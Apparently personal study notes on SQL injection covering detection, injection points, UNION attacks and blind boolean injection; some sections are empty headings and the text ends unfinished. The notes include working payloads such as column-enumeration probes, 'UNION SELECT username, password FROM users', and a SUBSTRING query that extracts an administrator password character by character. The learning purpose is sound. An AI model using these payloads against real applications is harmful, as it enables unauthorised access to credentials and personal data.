**What is SQL injection?**
**- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.**

**Impact**
- Passwords.
- Credit card details.
- Personal user informatio


# How to detect SQL injection vulnerabilities

- The single quote character ' and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

**Where it happned**
- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

**Type of SQL injection**
- **Retrieving hidden data**, where you can modify a SQL query to return additional results.
- **Subverting application logic**, where you can change a query to interfere with the application's logic.
- **UNION attacks**, where you can retrieve data from different database tables.
- **Blind SQL injection**, where the results of a query you control are not returned in the application's responses.

# Retrieving hidden data


# Subverting application logic


# Union Attack 

**Determining the number of columns required** - this is first step to perform the SQLi.

    #see until the error popups
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--

    #see untile get rids of errors.
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--

**Finding columns with a useful data type**

    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--

If the column data type is not compatible with string data, the injected query will cause a database error

**Using a SQL injection UNION attack to retrieve interesting data**

examples:

    ' UNION SELECT username, password FROM users--
    ' UNION SELECT username || '~' || password FROM users--     #when only one colunm is capable with string

# Blind SQL injection**
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors

**Exploiting blind SQL injection by triggering conditional responses**

    …xyz' AND '1'='1
    …xyz' AND '1'='2

- The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

example:

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    if the condition give trur then the some element is reflected on html other wise not.


**Error-based SQL injection**

